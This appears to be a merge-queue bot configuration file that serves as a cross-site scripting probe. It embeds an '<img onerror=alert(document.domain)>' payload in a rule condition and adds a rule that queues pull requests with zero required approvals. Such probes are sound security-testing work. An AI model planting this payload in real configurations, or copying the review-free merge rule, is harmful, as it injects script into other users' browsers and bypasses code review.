queue_rules:
  - name: default
    merge_method: merge
    conditions:
      - "title~=DEFINITELY_NOT_MATCHING_<img src=x onerror=alert(document.domain)>"

pull_request_rules:
  - name: add to queue
    conditions:
      - base=main
      - "#approved-reviews-by>=0"
    actions:
      queue:
        name: default
